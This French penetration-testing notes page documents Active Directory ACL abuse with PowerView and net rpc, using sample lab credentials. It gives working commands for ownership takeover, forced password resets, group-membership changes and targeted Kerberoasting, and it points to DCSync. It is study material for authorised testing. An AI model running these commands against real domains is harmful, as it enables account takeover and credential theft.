---
public: true
---

## Enumération des ACLs

```powershell
. .\PowerView.ps1
# ACLs intéressantes (très long)
Find-InterestingDomainAcl

# ACLs liées à un compte spécifique ($targetUserName)
$sid = Convert-NameToSid $targetUserName 
# peu prendre beaucoup de temps (plusieures minutes vois dizaines de minutes)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

## Exploitation de privilèges en notre possession

On s'appuiera souvent sur des informations d'identification différentes d'un compte préalablement compris.

Dans ce cas, on utilisera le parametre `-Credential $creds` avec un objet PSCredential créé de la façon suivante :

```powershell
$pass = "somePass"
$user = "DOMAIN\someuser"
$creds = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
```

### WriteOwner (appropriation d'un objet)

Permet de s'approprier un objet pour ensuite accéder à ses propriétés et ajouter d'autres ACLs (par exemple l'ajout du droit ForceChangePassword)

```powershell
# Appropriation d'un utilisateur (lorsqu'on a un droit WriteOwner référencé dans Bloodhound)
Set-DomainObjectOwner -Identity $targetUser -OwnerIdentity $compromisedUser
# Ajout d'une ACL sur le compte approprié pour réinitialiser le password :
Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -Rights ResetPassword
```

### ForceChangePassword (modification du mot de passe)

Windows

```powershell
# Target to reset password
$TargedUser = 'ssmalls'
$TargetNewPass = 'NewPass@Pentest@'
# Privileged user that can ForceChangePassword
$PrivUser = 'INLANEFREIGHT.LOCAL\hporter'
$PrivPassword = 'Gr8hambino!'

$SecPassword = ConvertTo-SecureString $PrivPassword -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential($PrivUser, $SecPassword)
$NewSecPassword = ConvertTo-SecureString $TargetNewPass -AsPlainText -Force
Set-DomainUserPassword -Identity $TargedUser -AccountPassword $NewSecPassword -Credential $Cred
```

Linux

```shell
# autres méthodes disponibles (voir l'aide de bloodhound)
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

### GenericWrite

Permet :

- l'ajout d'un utitilisateur comme membre d'un groupe sur le quel on dispose de ce droit
- la modification du script de login pour tenter une exécution de code à distance (au prochain logon)

```powershell
Add-DomainGroupMember -Identity "Target Group With GenericWrite right" -Members 'compromised'
# Verification
Get-DomainGroupMember -Identity "Target Group With GenericWrite right" | ?{$_.MemberName -eq 'compromised'}
```

### GenericAll
#### Sur un compte utilisateur
- Permet de récupérer le hash du mot de passe d'un utilisateur sur lequel on dispose de ce privilège.
- L'attaque se nomme "Targetted Kerberoasting".
- Elle conciste en la création d'un SPN sur le compte cible afin de récupérer un TGS à cracker hors ligne.
- Si le mot de passe est facile à deviner, on pourra le casser comme dans une attaque de Kerberoasting classique ([[Cassage de mots de passes Kerberos]])

```powershell
# Création d'un faux SPN pour pouvoir récupérer un TGS
Set-DomainObject -Identity $targetedUser -SET @{serviceprincipalname='nonexistent1/BLAHBLAH'}
# Récupération du TGS
Get-DomainUser $targetedUser | Get-DomainSPNTicket | fl
# Cleanup
Set-DomainObject -Identity $targetedUser -Clear serviceprincipalname
```

#### Sur un groupe
- elle permet de s'ajouter comme membre du groupe

#### Sur une OU
- elle permet d'ajouter un controle total sur l'OU et disposer d'un controle totale sur les objets qui sont dedans

### WriteDacl

Permet d'ajouter des DACL sur un compte utilisateur.

Cela peut permettre d'ajouter les permissions `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All` et `DS-Replication-Get-Changes-In-Filtered-Set` qui permettent de réaliser une attaque ([[DCSync]])
